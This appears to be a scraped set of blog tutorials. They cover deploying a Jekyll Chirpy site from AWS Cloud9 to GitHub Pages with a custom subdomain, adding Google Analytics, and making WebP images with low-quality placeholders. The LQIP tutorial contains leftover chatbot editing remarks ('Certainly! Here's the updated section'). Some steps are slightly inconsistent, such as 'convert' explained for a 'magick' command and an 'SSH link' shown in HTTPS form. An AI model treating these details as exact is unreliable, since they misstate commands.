    "content": "This documentation outlines the steps for setting up and deploying a documentation site using Jekyll, a popular static site generator, and the Chirpy theme using GitHub Actions on AWS Cloud9 IDE. It includes instructions for configuring a custom subdomain, such as https://docs.example.com, through AWS Route 53 and integrating it with GitHub Pages.Objectives  Launch and prepare the AWS Cloud9 environment  Set up the development environment for Jekyll with Chirpy on Cloud9  Configure Git and SSH for GitHub integration  Set up the Chirpy theme with the Chirpy starter template  Create and run a start script to preview your site in Cloud9  Deploy the site to GitHub Pages using GitHub Actions  Personalize the Jekyll site configuration and the about me page  Write your first post with Chirpy using Markdown syntax  (Optional) Map a custom domain to your GitHub Pages siteBy the end of this post, you will have your own documentation site hosted on GitHub Pages, a free hosting solution. The site will be set up with the Chirpy theme, which provides a beautifully structured layout and various features automatically. You can then focus on writing your content in Markdown, committing it to a Git repository, and let Chirpy and GitHub Actions handle the rest.Prerequisites  AWS Account  GitHub Account  (Optional) Registered domain on Amazon Route 53 (if you want to use a custom domain like docs)Launch and Prepare the AWS Cloud9 Environment  This documentation will utilize AWS Cloud9 running on Amazon Linux to set up Jekyll and the Chirpy theme. The Git panel extension for AWS Cloud9 will be used to provide convenient user interface access to core Git commands.a) Benefits of Using Cloud9      Cloud-Based Content Management:   Cloud9’s cloud-based setup enables bloggers and writers to remotely update their Jekyll/Chirpy site, perfect for regular content updates.        Uniform Starting Point:   Using Cloud9 ensures that everyone, especially for tutorial purposes, begins with a blank Linux instance, allowing learners to follow along precisely without environment discrepancies.        Version Control Integration:   Git integration with Cloud9 simplifies version control, useful for managing updates, and theme modifications.    The AWS Free Tier provides 750 monthly hours of EC2 t2.micro usage and 5GB EBS storage for one year. This demo, run on a t2.micro instance using less than 1GB storage, incurs no additional costs under the Free Tier. Without it, the cost is approximately $0.11 per hour.b) Set Up the Cloud9 Environment  Navigate to the AWS Cloud9 console.  Create a new environment named JekyllChirpyEnv (or any name you prefer).  Configure the environment as needed, t2.micro will suit the requirements.  Once your environment is ready, open the terminal within the Cloud9 IDE.  Update your package manager to ensure you have the latest packages.sudo yum update -y  The -y flag automatically answers ‘yes’ to any prompts during the update process, allowing it to run without manual intervention.Set Up the Development Environment for Jekyll with Chirpy on AWS Cloud9To set up your development environment for Jekyll with Chirpy on AWS Cloud9, you’ll go through a series of steps involving the installation of Ruby, necessary development tools, configuring the Ruby Gems environment, and installing Jekyll along with Bundler. These steps ensure your AWS Cloud9 environment is fully prepared for Jekyll Chirpy development.  If you prefer using your own text editor like VS Code, macOS users can apply the same Linux commands in the Terminal for setting up Jekyll, Ruby, and Chirpy.a) Install Ruby and Development ToolsExecute the following commands in the Cloud9 terminal:sudo yum install -y ruby ruby-develsudo yum groupinstall -y \"Development Tools\"b) Configure Ruby Gems EnvironmentSet up a specific directory for RubyGems to streamline gem management. This setup:  Enables user-level gem installations, reducing security risks.  Creates an isolated environment for gems, preventing version conflicts.  Simplifies the process of managing, updating, and uninstalling gems.  Prevents permission-related problems common with system-wide installations.  Enhances the portability of the development environment across different machines.echo '# Install Ruby Gems to ~/gems' &gt;&gt; ~/.bashrcecho 'export GEM_HOME=\"$HOME/gems\"' &gt;&gt; ~/.bashrcecho 'export PATH=\"$HOME/gems/bin:$PATH\"' &gt;&gt; ~/.bashrcsource ~/.bashrcc) Install Jekyll and BundlerWith the RubyGems environment now configured, proceed to install Jekyll and Bundler:gem install jekyll bundlerd) Update RubyGems if NecessaryShould there be a new release of RubyGems available, update to the latest version:gem update --system 3.5.6e) Verify Jekyll InstallationEnsure Jekyll is correctly installed by checking its version:jekyll -v  The JekyllChirpy environment on AWS Cloud9 is now fully set up and ready for development.Configure Git and SSH for GitHub IntegrationBefore you start using Git, configure it with your personal information which will be associated with your commits.a) Configure Git with Your User Informationgit config --global user.name \"Your Name\"git config --global user.email \"youremail@example.com\"  Replace “Your Name” and “youremail@example.com” with your actual name and email associated with your GitHub account.  The new name you set will be visible in any future commits you push to GitHub from the command line. If you’d like to keep your real name private, you can use any text as your Git username.b) Generate an SSH Key PairSSH key pairs facilitate secure, passwordless authentication with GitHub, linking commits to your account and ensuring only authorized users can access repositories:ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"  Press Enter to accept the default file locations.  Press Enter twice on passphrase prompts (entering a passphrase is optional).c) Start the ssh-agent &amp; Add Your SSH Keyeval \"$(ssh-agent -s)\"ssh-add ~/.ssh/id_rsad) Display and Copy your SSH public keycat ~/.ssh/id_rsa.pube) Add Your SSH Public Key to Your GitHub AccountGitHub → Settings → SSH &amp; GPG Keys → New SSH key → Paste Keyf) Verify SSH Connection to GitHubssh -T git@github.com  You should see a message confirming successful authentication.  Your AWS Cloud9 environment will be fully configured to interact with GitHub using SSH.Set Up the Chirpy theme with the Chirpy Starter templateCreating a new site with the Chirpy theme is straightforward using the Chirpy Starter. This method is preferred for its simplicity and maintenance ease, ideal for AWS cloud engineers and technical writers who wish to focus on their content rather than the technical aspects of website setup.a) Use the Chirpy Starter Template  Visit the Chirpy Starter Repository on GitHub.**  Click on the Use this template button at the repository page.  Name the new repository USERNAME.github.io, where USERNAME is your GitHub username. This naming is crucial for GitHub Pages to automatically host the site.  Ensure the repository is set to public. GitHub Pages requires the repository to be public to serve the website unless you are on a GitHub plan that supports private repositories for GitHub Pages.  Click Create repository from template to initiate the new repository setup.  Your site will be available at https://USERNAME.github.iob) Clone your New Repository Using Cloud9:  Obtain the SSH link from your GitHub repository  In the Cloud9 environment, locate the Git panel window and select Clone Repository  Enter the SSH Link.          This will be in the format https://github.com/USERNAME/USERNAME.github.io.git        After entering the URL, press Return  A dialog box will appear prompting you to select a workspace folder for the cloned repository. Choose your desired location and click Select Repository Location to finalize the cloning process.c) Install Jekyll and Other Dependencies:bundle install  This will install all the Ruby gems needed for your Jekyll site, as specified in the Gemfile, which includes Jekyll itself and any plugins or themes you’re using.Preview the Jekyll SiteTo preview a Jekyll site locally, the command bundle exec jekyll serve is used, which starts a server and makes the site accessible at http://localhost:4000.  When moving to AWS Cloud9, a cloud-based development environment, adjustments are necessary: 127.0.0.1:4000 won’t work due to Cloud9’s remote nature.Instead, Cloud9 requires using its environment URL and supports web traffic on ports 8080, 8081, and 8082, necessitating a change in server settings to make your site accessible.  127.0.0.1:4000 and http://localhost:4000 both direct you to the same location: your local development server running on port 4000. The term “localhost” is a hostname that translates to the IP address 127.0.0.1, which represents your own computer.The adjusted command to run Jekyll in Cloud9, accommodating its supported ports and making your site accessible, would be:bundle exec jekyll serve --host 0.0.0.0 --port 8080 --baseurl ''a) Create and Run a Start Script to preview the site in Cloud9Entering the command bundle exec jekyll serve --host 0.0.0.0 --port 8080 --baseurl '' every time you want to preview your site can be time-consuming. Instead, creating a start script in Cloud9 can automate the server launch process. Here’s how to set it up:  Open Cloud9 Terminal:          Navigate to your project directory within the Cloud9 IDE.        Create a New File for the Start Script:          Within the file explorer under your project directory, create a new file named start_jekyll.sh.        Edit the Start Script:          Open start_jekyll.sh in the Cloud9 editor and input the following line to configure Jekyll for Cloud9:        bundle exec jekyll serve --host 0.0.0.0 --port 8080 --baseurl ''                            Use --host 0.0.0.0 to make the server accessible from any IP address, --port 8080 to comply with Cloud9’s allowed web traffic ports, and --baseurl '' to correctly reference resources.      Save the changes to the script.        Run the Start Script:          Press the Run button in Cloud9.      This command initiates the Jekyll server on Cloud9’s specified ports, making your site accessible.        Access Your Site:          Your site can be viewed at Cloud9’s environment URL, formatted as:                  https://&lt;workspace-name&gt;-&lt;username&gt;.vfs.cloud9.&lt;region&gt;.amazonaws.com:8080                    This setup allows you to run and preview your Jekyll site directly from the AWS Cloud9 environment, adapting the local development workflow to the cloud.Deploy the Jekyll Site to GitHub Pages using GitHub ActionsDeploying your Jekyll site through GitHub Actions automates the process, establishing a CI/CD pipeline that automatically builds your site and deploys it to GitHub Pages upon any push to your repository. This is particularly beneficial for Jekyll Chirpy theme users, as it includes a pre-configured GitHub Actions workflow suitable for this purpose.  To  make the .github directory visible, and access the GitHub Actions workflow configurations make sure your AWS Cloud9 environment is correctly set up to show hidden files:          Click on the gear icon (Preferences).      Select Show Hidden Files      a) The GitHub Actions WorkflowThe GitHub Actions workflow, specifically tailored for Jekyll deployments, is structured to facilitate seamless builds and deployments. Here’s a breakdown of its components:  Navigate to Workflow:          Access the workflows folder within the .github directory.      Open the pages-deploy.yaml file to examine the workflow details.        Workflow Overview:          The workflow is named Build and Deploy.      It activates on pushes to both the main and master branches, with exceptions for changes to .gitignore, README.md, and LICENSE files. Manual triggers are also supported.      It’s configured with read permissions for contents and write permissions for pages and ID tokens, ensuring secure and authorized operations.      Designed to run a single deployment at a time, it cancels any in-progress deployments upon new pushes to streamline the update process.        Jobs Detail:          Utilizes the latest Ubuntu runner for operations like checking out the code, setting up GitHub Pages, configuring Ruby, building the site via Jekyll, performing tests with htmlproofer, and uploading the site as an artifact for deployment.      Focuses on deploying the built site to GitHub Pages and providing a URL to the deployed site.      b) Configure GitHub Pages DeploymentTo ensure your site deploys via GitHub Actions to GitHub Pages, a few configuration steps are necessary within your GitHub repository settings:  Access Repository Settings:          Navigate to your GitHub repository online and enter the settings menu.        Locate Pages Section:          Within the settings, find and click on the Pages option on the left navigation bar to access GitHub Pages settings.        Deployment Source Setup:          In the Build and deployment section, find the Source setting.      Choose GitHub Actions from the dropdown menu to enable deployments through GitHub Actions.      This setup ensures that every push to your repository triggers the GitHub Actions workflow, automatically building your Jekyll site and deploying it to GitHub Pages. It’s a streamlined process that simplifies site updates, allowing you to focus more on content creation and less on manual deployment tasks.  Tip: For users of GitHub’s free tier, keep your repository public to utilize GitHub Pages without any costs.c) Set the Site URL for GitHub PagesBefore pushing your Jekyll site to GitHub, configure the _config.yml file to set your site’s URL and personalize various settings.  GitHub Pages requires the correct base URL to serve your site. This is a critical step for your site’s accessibility and functionality.      Open the _config.yml file and find the url field, which sets the base URL for your site. For example, if your GitHub   username is digitalden3, your url would be:    url: \"https://digitalden3.github.io\"              By setting the url, you enable GitHub Pages to host your site at a predictable address based on your username.      d) Personalize the Jekyll Site ConfigurationWith the URL set, continue to personalize your site by updating these important fields in the _config.yml file:  title tagline and description:          Define your site’s title and description to improve search engine optimization (SEO).        timezone:          Set the correct timezone to ensure your posts have accurate timestamps.      Use a Time Zone Picker to find your timezone string.        username:          Enter your social media usernames (github.username, twitter.username…).        name and email:          Provide your full name and email address under the social section for use in site elements like the footer.        theme_mode:          Choose your theme preference. Light, dark, or automatic.        avatar:          Add a profile picture.                  Store your images in an organized directory, such as assets/images/.          Upload your preferred image to this directory.          Reference your avatar in the avatar field:                      avatar: \"/assets/images/your-image.jpg\"        To ensure your site loads quickly, optimize your images! Use efficient image formats, such as WebP.e)Deploy the Jekyll Site with GitHub ActionsDeploying your Jekyll site to GitHub Pages using GitHub Actions automates the build and publish process, making site updates seamless with every push. In the AWS Cloud9 interface, select to the Source Control panel.  Stage Your Changes:          Go to the Git panel menu and choose Stage All Changes.      Choose Stage All Changes.        Commit Your Changes:          In the Source Control panel, you should see a text box where you can enter a commit message.      Enter Deploying Jekyll Site.      Go to the Git panel menu and choose Commit All.        Push Changes to GitHub:          Go to the Git panel menu and choose Push. This action will push your commits to the GitHub repository, triggering the GitHub Actions workflow.        Deployment via GitHub Actions:          Navigate to your GitHub repository in a web browser.      Click on the Actions tab near the top of the repository page. This is where all the automated workflows are listed.      Inside the Actions tab, you’ll see a list of all the workflow runs. Each run corresponds to a push you’ve made to the repository.      Click on the latest run to see the details of the workflow execution, including setup, build, and deployment steps.      After the GitHub Actions workflow completes, your site will be live. GitHub will provide a URL where your site is hosted, which will typically follow this format:                  https://&lt;username&gt;.github.io                    Personalize the About Me PageUpdate your About Me page on your Jekyll site to reflect your personality, professional journey, hobbies, and more. You can also add images.  Edit the About Me Page:          Navigate to _tabs/about.md in your project files within Cloud9. This file is where you’ll introduce yourself and share your story.        Incorporate Your Personal Story:          Begin by writing about yourself. You might include your background, what you do professionally, your passions, and the purpose of your site.        Upload Images:          To add images, go to the assets/img directory in the Cloud9 file tree.      Select File → Upload Local Files.        Insert an Image in Your About Me Page:          Add the following line of markdown to _tabs/about.md to include an image. Ensure to replace profileimage.jpg with the actual name of your uploaded image file.        ![About](/assets/img/profileimage.jpg)        Save Your Changes:          After editing and adding images, save the`about.md file.        Preview Your Site:          Use Cloud9’s built-in server to preview your site and see how the changes appear in real-time.        Deploying Changes to GitHub          Stage All Changes in the Git panel → Enter a message and commit → Push changes to deploy via GitHub Actions.      Write the First Post with Chirpy Using Markdown SyntaxCreating a new post in Jekyll using the Chirpy theme is straightforward. Chirpy enhances Jekyll with unique features and requires specific variables in posts.  Markdown is a lightweight markup language with plain text formatting syntax that is designed to be converted to HTML and other formats. It’s very simple to use and allows you to write rich content with plain text.For better management, organize posts within the _posts folder by year (2023, 2024…). This helps keep your directory structured without affecting post processing.  File Naming:          Place your post in the correct year folder within _posts, naming it YYYY-MM-DD-TITLE.MD        Front Matter          Use the following template at the start of your post:      ---title: \"Your Post Title\"date: YYYY-MM-DD HH:MM:SS +/-TTTTcategories: [Primary Category, Subcategory]tags: [tag1, tag2, tag3]image: /path/to/imagealt: \"Image alt text\"---  title: The title of your post.  date: The publication date and time of your post, including the timezone.  categories: Categories for organizing your post, limited to two.  tags: Keywords associated with your post for tagging purposes.  image: An optional path to a preview image for your post.  alt: Descriptive text for the preview image, used for accessibility and SEO.Following these initial steps sets up an empty post scaffold. To fill your post with content, you’ll write in Markdown, a straightforward yet powerful syntax for creating web content. For detailed guidance, including Markdown syntax and advanced Chirpy features, consult the:  Chirpy documentation on writing a new post  The Jekyll Chirpy theme automatically transforms your Markdown content into a visually appealing website. By applying CSS for styling, HTML templates for structure, and JavaScript for interactivity, Chirpy ensures your content is readable, engaging and professionally presented.  Workflow:  Write Post → Preview → Stage New Post → Commit → Push to GitHub → DeploymentMap a Custom Domain to GitHub Pages (Optional)GitHub Pages offers free hosting for websites, allowing the use of custom domains to improve brand identity, SEO, and more. This guide explains the process of mapping a custom domain to GitHub Pages, taking advantage of GitHub’s secure hosting.When opting for a subdomain, such as docs.example.com, over the primary domain (example.com), you strategically organize and differentiate content. A subdomain like docs specifically earmarks this section for documentation, facilitating centralized content management.  For implementation, replace example.com with your own domain.a) Create a CNAME File in Cloud9  In Cloud9, go to your repository’s root directory.  Right-click, choose New File, and name it CNAME—no file extension.  Open CNAME, input docs.example.com, and save.b) Push the CNAME File to GitHub  Follow the sequence: Stage CNAME → Commit → Push to GitHub → Deployment.c) Set Custom Domain in GitHub Pages Settings  In your GitHub repository settings, select Pages  Under Custom domain, enter docs.example.com and save.  A DNS record error may initially appear—this resolves after proper DNS setup.d) Create a CNAME Record in AWS Route 53  Access Route 53 in the AWS Management Console.  In your hosted zone, add a CNAME record:          Record Name: docs      Type: CNAME      Value: USERNAME.github.io (replace USERNAME).      e) Verify DNS Configuration  Confirm DNS setup with:    dig docs.example.com +nostats +nocomments +nocmd              GitHub Pages will show DNS checks in progress after correct DNS setup.      Post-DNS verification, enable Enforce HTTPS in GitHub Pages settings.      GitHub automatically secures your site with an SSL certificate, a process that may take up to 24 hours.      f) Update URL in _config.yml to Custom Subdomain  Open your Jekyll project in your Cloud9.  Open the _config.yml file in the root directory of your Jekyll project.  Find the url field in the _config.yml file. It might look something like this:    url: \"https://USERNAME.github.io\"        Update the url field to use your custom subdomain. Replace https://USERNAME.github.io with https://docs.example.com    url: \"https://docs.example.com\"        Save the changes to the _config.yml file.  By updating the urL field in your _config.yml file to https://docs.example.com, you ensure that all internal links, metadata, and references within your Jekyll site point to the correct custom subdomain. This step is crucial for maintaining consistency and accuracy across your site, especially when using a custom domain.  After making this change, push the updated _config.yml file to your GitHub repository.Your GitHub Pages site will be accessible via your custom domain docs.example.com, leveraging GitHub’s secure and reliable hosting.Video Tutorial"

Start Collecting Data:          Choose Data Collection Source: Select Web        Set Up Web Data Collection:          Website URL: Enter your website URL.      Stream Name: Suggest a descriptive name for your stream, such as My Blog Stream or Chirpy Site Stream.      to generate the tracking ID and global site tag click Create Stream        Copy the Measurement ID:          After the stream is created, note down your Measurement ID (it looks like G-XXXXXXXX).      Set Up Google Analytics in Your Jekyll Chirpy Site  Update _config.yml with Your Google Analytics ID:          Open your _config.yml file and add or update the Google Analytics section:        google_analytics:  id: \"G-XXXXXXXX\" # replace with your actual Google Analytics Measurement ID        Ensure the _includes Directory Exists:    mkdir -p _includes        This command creates the _includes directory if it doesn’t already exist. This directory is a standard Jekyll folder used for storing reusable content snippets, like our Google Analytics code. Creating it ensures proper Jekyll structure and prevents potential build errors.              Create the analytics.html File:      Create analytics.html in the _includes directory to isolate the Google Analytics tracking code, making it easier to manage and include across multiple pages in our Jekyll site.                  Create a file named analytics.html in the _includes directory.          Add the following code into the file:                      &lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;&lt;script async src=\"https://www.googletagmanager.com/gtag/js?id={{ site.google_analytics.id }}\"&gt;&lt;/script&gt;&lt;script&gt;  /* global dataLayer */  window.dataLayer = window.dataLayer || [];  function gtag(){dataLayer.push(arguments);}  gtag('js', new Date());  gtag('config', '{{ site.google_analytics.id }}');&lt;/script&gt;              The /* global dataLayer */ tells the text editor or linter that dataLayer is a global variable, preventing it from showing warnings about dataLayer being undefined.      The use of {{ site.google_analytics.id }} instead of a hardcoded ID allows you to set the Google Analytics ID in your _config.yml file, making it easier to update or change in the future.                  Modify default.html in the _layouts Directory:      Modify the default.html file to include the Google Analytics code on all pages while ensuring it only loads in the production environment. This approach prevents tracking during development and testing.                  Add the following lines into default.html just above the closing &lt;/head&gt; tag to include the analytics.html file conditionally:                      &lt;head&gt;  {% if jekyll.environment == 'production' and site.google_analytics %}    {% include analytics.html %}  {% endif %}&lt;/head&gt;        This placement ensures that the Google Analytics code is included within the &lt;head&gt; section of your HTML document, which is the recommended location for such scripts. Placing it just before the closing &lt;/head&gt; tag, ensures it’s one of the last things loaded in the head, which can help with page load performance.          To see an example of how this looks in a real default.html file, you can check out my default.html on GitHub.      Build and Deploy Your Site            Build the Site:      Run the build command with the production environment variable to ensure Google Analytics is included:        JEKYLL_ENV=production bundle exec jekyll build -d \"_site\"              The JEKYLL_ENV=production environment variable tells Jekyll to build the site in production mode, enabling features like Google Analytics that are meant only for the live site.                  Commit and Push the Changes:      Stage, commit, and push your changes to your repository:         git add . git commit -m \"Add Google Analytics tracking to the site\" git push      Verify Google Analytics Integration      Check Real-Time Report:Verify that your site is sending data to Google Analytics:          Visit the Google Analytics Dashboard.      Select your Jekyll Chirpy site’s property.      Select Realtime      Open your website in a separate browser tab or window.      Navigate through your site and watch for activity in the Real-Time report.              It may take a few hours before data starts appearing in your Google Analytics dashboard.            Inspect Your Site’s Source Code:Confirm that the Google Analytics code is properly embedded in your site:          Open your live website in any browser.      Right-click and select View Page Source              Search for the Google Analytics tracking code in the &lt;head&gt; section. It should look similar to this:        &lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;&lt;script async src=\"https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXX\"&gt;&lt;/script&gt;&lt;script&gt;  window.dataLayer = window.dataLayer || [];  function gtag(){dataLayer.push(arguments);}  gtag('js', new Date());  gtag('config', 'G-XXXXXXXX');&lt;/script&gt;                    "

    "content": "This documentation will show you how to implement Low-Quality Image Placeholders (LQIP) in your Jekyll site, enhancing user experience by displaying a low-resolution version of an image while the full-resolution image loads. You’ll also learn how to prepare images specifically for the Chirpy theme and convert them to the efficient WebP format, ensuring optimal display and performance. These techniques can be applied to any Jekyll site, including those using the Chirpy theme, to significantly improve loading times and overall site performance.Objectives  Understand the Benefits of LQIP  Prepare Images for the Chirpy Theme  Install WebP Tools  Convert Images to WebP Format  Integrate LQIP in Jekyll Posts  Generate Base64-Encoded LQIP  Implement and Test LQIPPrerequisitesTo follow this tutorial, you will need the following open-source tools installed on your system:  WebP tools          Developed by Google for efficient web image compression      Includes cwebp for encoding images to WebP format        ImageMagick          A comprehensive suite for image manipulation and conversion      Used for resizing, quality adjustment, and LQIP generation      Optional but recommended:  Canva or similar visual editing tool          Useful for initial image resizing and composition        Step-by-step instructions for installing WebP tools and ImageMagick will be provided in the next section. Both tools are compatible with major operating systems (Windows, macOS, Linux).Benefits of LQIPLQIP (Low-Quality Image Placeholder) is a technique where a low-resolution version of an image is encoded in base64 and placed in the front matter. This ensures a quick preview is displayed while the high-resolution image loads, improving the perceived loading time and user experience.LQIP is beneficial for several reasons:  Improves User Experience:          Provides faster perceived loading times by giving users a quick visual cue that an image is about to load.      Replaces blank spaces or broken image icons with a blurred or low-resolution version of the image, maintaining the visual integrity of the page.        Performance Benefits:          Uses a small, low-resolution version of the image, which loads quickly and requires minimal data.      Particularly beneficial for users on slower connections or mobile devices.      Allows users to see content progressively load, making the website feel faster and more responsive.        SEO and Accessibility Improvements:          Faster-loading pages can improve search engine rankings, as page speed is a factor in search algorithms.      Contributes to better performance metrics.      Increases the likelihood that users will stay on a page that loads quickly and smoothly, reducing bounce rates and potentially increasing user engagement and conversions.        Visual Appeal:          Smooth transitions from a low-quality placeholder to a high-quality image provide a more visually appealing experience.      Adds a layer of polish to the website, making it look more professional and well-designed.      Task 1: Prepare Your Image  Ensure Image Readiness:          For the Chirpy theme, your image should have a resolution of 1200 x 630 pixels.      This resolution ensures the images look great and maintain a consistent aspect ratio.        Aspect Ratio Requirement:          The aspect ratio should meet 1.91:1.      If the aspect ratio does not meet this requirement, the image will be scaled and cropped.        Using Canva for Image Preparation:          Canva is an excellent tool for resizing and cropping images effectively.      It provides a visual interface for precise control over cropping and composition.      Steps to prepare your image in Canva:                  Create a new design with custom dimensions of 1200x630 pixels.          Upload your image and place it within the design.          Adjust the image to fit the frame, ensuring important elements are visible.          Export the image as a high-quality PNG or JPG.                      While you can also use WebP tools for resizing and converting images, Canva offers real-time visual adjustments, allowing for precise image composition before conversion. This can be particularly useful for ensuring your images look exactly as intended within the Chirpy theme’s layout.Task 2: Install WebPAfter preparing your image with tools like Canva, you will need to convert it to the WebP format for better compression and performance on your website. Before you can convert your images to WebP format, you need to install the WebP tools.What is WebP and Why is it Useful?WebP is a modern image format developed by Google that provides superior compression and quality characteristics compared to traditional image formats like JPEG and PNG. Using WebP, you can reduce the file size of your images significantly without compromising on quality, which leads to faster loading times and improved performance for your website. WebP can reduce image file sizes by up to 30% more than JPEG and PNG while maintaining similar quality. It supports both lossy and lossless compression, allowing for high-quality images with smaller file sizes. WebP also supports transparent backgrounds (like PNG) and animations (like GIF), making it versatile for various web image needs.What Do WebP Tools Do?WebP tools are command-line utilities that allow you to convert images from various formats (such as PNG, JPEG, and TIFF) to WebP. These tools are typically used in the terminal or command prompt, and they provide options to adjust compression settings, quality, and other parameters to optimize the images for your specific requirements. With WebP tools, you can perform batch conversions, fine-tune image quality, and automate image processing tasks through scripts or build processes.Follow these steps to install WebP:  For macOS:          If you’re using Homebrew, you can install WebP by running:        brew install webp                      For Linux:          If you’re using a Debian-based distribution (like Ubuntu), you can install WebP by running:        sudo apt-get install webp                      For Windows:          Download the WebP binaries from the WebP project page and follow the instructions to install.      This section is good, but we can enhance it with more details and options. Here’s an expanded version:Task 3: Convert Image to WebP FormatUse the following command to convert your image to WebP format:cwebp chirpy-fast-load.png -o chirpy-fast-load.webpThis command uses the cwebp tool to convert the PNG image to WebP format. The -o flag specifies the output file name.Additional Options  To set a specific quality level (0-100), use the -q flag:    cwebp -q 80 chirpy-fast-load.png -o chirpy-fast-load.webp        For lossless compression, add the -lossless flag:    cwebp -lossless chirpy-fast-load.png -o chirpy-fast-load.webp        To resize the image during conversion, use the -resize flag:    cwebp -resize 800 600 chirpy-fast-load.png -o chirpy-fast-load.webp        You can also convert images from WebP to other formats using the dwebp tool, which is part of the WebP toolset.For more advanced options and usage, refer to the WebP documentation.Task 4: Add Image to Front MatterIn your Jekyll post, add the image to the front matter. The front matter should include the title, date, categories, tags, and image information. Here’s an example:---title: \"Create Fast-Loading Images With Low-Quality Image Placeholders (LQIP) in Your Jekyll Chirpy Site\"date: 2024-06-19 08:00:00 - 0500categories: [Web Development, Jekyll]tags: [aws, cloud9, jekyll, chirpy, ruby, git]image:   path: /assets/img/headers/chirpy-fast-load.webp---This section is well-structured and provides clear instructions for installing ImageMagick and generating the LQIP. However, we can enhance it slightly for more clarity and completeness:Task 5: Generate LQIPLow-Quality Image Placeholders (LQIP) are crucial for improving perceived loading times and enhancing user experience. To create these placeholders, we’ll use ImageMagick, a powerful image manipulation tool.Using ImageMagick for LQIPImageMagick is an open-source image manipulation tool that can be used to create a base64 encoded placeholder image for LQIP. Before using ImageMagick, you need to install it. Follow these steps to install ImageMagick on your system:  For macOS:          If you’re using Homebrew, you can install ImageMagick by running:        brew install imagemagick                      For Linux:          If you’re using a Debian-based distribution (like Ubuntu), you can install ImageMagick by running:        sudo apt-get install imagemagick                      For Windows:          Download the ImageMagick installer from the ImageMagick download page and follow the instructions to install.      Certainly! Here’s the updated section with the new command and explanation:Generate the LQIPThe following command resizes the image to a small size, reduces its quality, converts it to WebP format, encodes it to base64, and then cleans up the temporary file:magick chirpy-fast-load.webp -resize 20x20 -strip -quality 20 tmp.webp &amp;&amp; \\base64 tmp.webp &amp;&amp; \\rm tmp.webpThis configuration strikes an optimal balance between base64 string length and image quality, ensuring an effective placeholder without unnecessary size or quality loss. Here’s a breakdown of the command:  convert chirpy-fast-load.webp: Uses the original WebP image as input.  -resize 20x20: Resizes the image to 20x20 pixels, providing a good balance between detail and file size.  -strip: Removes all metadata to reduce file size.  -quality 20: Sets the WebP quality to 20, balancing visual fidelity and file size.  tmp.webp: Creates a temporary WebP file.  base64 tmp.webp: Converts the temporary file to a base64 string.  rm tmp.webp: Removes the temporary file after encoding.This approach maintains the WebP format throughout the process, ensuring consistency with your main image format and potentially providing better compression for the placeholder.  The base64 output will be displayed in your terminal. Make sure to copy this output for use in the next step. If the result isn’t satisfactory, you can adjust the size (e.g., 15x15 to 25x25) or quality (e.g., 15 to 30) to find the optimal balance for your specific images.Task 6: Add LQIP to Front MatterAfter generating the base64 string, you need to copy it and add it to the front matter of your Jekyll post. Here is an example of how to include it:---title: \"Create Fast-Loading Images With Low-Quality Image Placeholders (LQIP) in Your Jekyll Chirpy Site\"date: 2024-06-19 08:00:00 - 0500categories: [Web Development, Jekyll]tags: [aws, cloud9, jekyll, chirpy, ruby, git]image:   path: /assets/img/headers/chirpy-fast-load.webp  lqip: data:image/webp;base64,YOUR_BASE64_STRING_HERE---Replace YOUR_BASE64_STRING_HERE with the actual base64 string you generated.  The data:image/webp;base64, prefix is crucial. It tells the browser that this is a base64-encoded WebP image. This prefix matches the WebP format we used in the LQIP generation step. If you decide to use a different image format in the future, remember to adjust this prefix accordingly (e.g., data:image/png;base64, for PNG or data:image/jpeg;base64, for JPEG).Task 7: Implement and Test LQIPTo verify that the LQIP implementation is working correctly, follow these steps:  Build and Serve Your Jekyll Site:          Run the following command in your terminal to build and serve your Jekyll site locally:        bundle exec jekyll serve                    Open your web browser and navigate to http://localhost:4000 to view your site.        Check the Placeholder Image:          Navigate to the post where you added the LQIP.      Inspect the image loading process. You should see the low-resolution placeholder image (LQIP) first, followed by the high-resolution image once it loads.      If you don’t notice the LQIP, try clearing your browser cache or using incognito/private browsing mode.        Use Developer Tools:          Open your browser’s developer tools.      Go to the Network tab and refresh the page.      Look for the image requests in the network log. Verify that the base64-encoded placeholder image loads initially, followed by the full-resolution image.      Check the Img column in the Network tab to see the LQIP being used before the main image loads.      When you open the data:image entry, you should see a small, blurry version of your image. This is your Low-Quality Image Placeholder. If you see this, congratulations! Your LQIP is working correctly.        The Chirpy theme natively supports LQIP implementation. If you’re not seeing the LQIP effect, double-check your front matter syntax to ensure it matches the format shown in Task 6. If issues persist, verify that you’re using the latest version of the Chirpy theme and that no custom modifications are interfering with the LQIP functionality.Video TutorialFor a visual walkthrough of this process, check out my video tutorial:"
